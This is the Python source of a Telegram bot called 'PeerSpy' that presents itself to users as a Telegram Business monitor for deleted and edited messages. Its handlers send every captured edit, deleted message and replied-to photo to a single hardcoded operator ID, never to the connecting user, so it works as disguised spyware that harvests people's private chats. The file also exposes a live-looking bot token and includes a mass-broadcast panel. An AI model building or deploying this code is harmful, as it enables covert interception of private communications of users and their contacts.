import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- КОНФИГ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 
START_TIME = datetime.now().strftime("%d.%m.%Y %H:%M")

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, text TEXT, date TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

# --- СЕРВЕР ДЛЯ RENDER ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy Engine: Status OK"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- ИНИЦИАЛИЗАЦИЯ БОТА ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
router = Router()

class States(StatesGroup):
    bc = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def get_stats():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    u_count = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM messages")
    m_count = cur.fetchone()[0]
    conn.close()
    return u_count, m_count

# --- ОБРАБОТЧИКИ СОБЫТИЙ ---

async def cmd_start(m: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (m.from_user.id, m.from_user.username, datetime.now().strftime("%Y-%m-%d")))
    conn.commit()
    conn.close()
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="🛠 Инструкция", callback_data="inst"))
    if m.from_user.id == ADMIN_ID:
        kb.row(types.InlineKeyboardButton(text="💎 Admin Panel", callback_data="adm"))
    
    await m.answer(
        f"<b>┏━━━━ PeerSpy v4.0 ━━━━┓</b>\n\n"
        f"Привет, <b>{m.from_user.first_name}</b>!\n"
        f"Система мониторинга <b>Telegram Business</b>\n"
        f"успешно интегрирована и активна. 🛡\n\n"
        f"<i>Все удаления и правки в ваших чатах\n"
        f"теперь фиксируются мгновенно.</i>\n\n"
        f"<b>┗━━━━━━━━━━━━━━━━━━┛</b>",
        reply_markup=kb.as_markup()
    )

async def biz_handler(m: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    txt = m.text or m.caption or "[Медиа/Стикер]"
    m_id = str(m.message_id)
    
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (m_id,))
    old = cur.fetchone()
    
    if old and old[0] != txt:
        await bot.send_message(ADMIN_ID, 
            f"📝 <b>ИЗМЕНЕНИЕ СООБЩЕНИЯ</b>\n"
            f"────────────────────\n"
            f"<b>Старый текст:</b>\n<code>{old[0]}</code>\n\n"
            f"<b>Новый текст:</b>\n<code>{txt}</code>")
    
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (m_id, txt, str(datetime.now())))
    conn.commit()
    conn.close()

    if m.reply_to_message and m.reply_to_message.photo:
        f_id = m.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                res = await r.json()
                if res.get("ok"):
                    path = res["result"]["file_path"]
                    async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await fr.read(), filename="s.jpg"), 
                        caption="📸 <b>ФОТО ПЕРЕХВАЧЕНО</b>\n────────────────────\n<i>Объект пытался скрыть медиафайл.</i>")

async def delete_handler(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, 
                f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\n"
                f"────────────────────\n"
                f"<b>Текст:</b>\n<code>{res[0]}</code>")
    conn.close()

# --- АДМИНКА ---
@router.callback_query(F.data == "adm")
async def adm_menu(c: types.CallbackQuery):
    u, m = get_stats()
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="bc"))
    kb.row(types.InlineKeyboardButton(text="🔄 Обновить", callback_data="adm"))
    
    await c.message.edit_text(
        f"<b>💎 ПАНЕЛЬ УПРАВЛЕНИЯ</b>\n"
        f"────────────────────\n"
        f"👥 <b>Пользователей:</b> <code>{u}</code>\n"
        f"📩 <b>В базе логов:</b> <code>{m}</code>\n"
        f"⏳ <b>Аптайм с:</b> <code>{START_TIME}</code>\n"
        f"⚙️ <b>Статус:</b> <code>Online</code>\n"
        f"────────────────────",
        reply_markup=kb.as_markup()
    )

@router.callback_query(F.data == "inst")
async def inst_cb(c: types.CallbackQuery):
    await c.message.answer("<b>ИНСТРУКЦИЯ</b>\n\n1. Настройки → Telegram Business → Чат-боты\n2. Нажмите <b>Добавить бота</b>\n3. Выберите @peerspybot\n4. Дайте разрешение на <b>Доступ к сообщениям</b>."); await c.answer()

@router.callback_query(F.data == "bc")
async def bc_start(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("📤 <b>РЕЖИМ РАССЫЛКИ</b>\nВведите текст сообщения для всех пользователей:"); await state.set_state(States.bc); await c.answer()

@router.message(States.bc)
async def bc_final(m: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
    sent = 0
    for u in users:
        try: await bot.send_message(u[0], m.text); sent += 1
        except: pass
    await m.answer(f"✅ <b>Рассылка завершена!</b>\nПолучили: {sent} чел."); await state.clear()

# --- РЕГИСТРАЦИЯ (ULTRA SAFE) ---
router.message.register(cmd_start, Command("start"))
router.business_message.register(biz_handler)

try:
    router.business_edited_message.register(biz_handler)
    router.business_deleted_messages.register(delete_handler)
except AttributeError:
    # Резервный метод через update, если AttributeError
    dp.update.register(biz_handler, F.business_message)
    dp.update.register(delete_handler, F.business_deleted_messages)

async def main():
    init_db()
    dp.include_router(router)
    Thread(target=run_web).start()
    print("🚀 PEERSPY STARTED SUCCESSFULLY")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
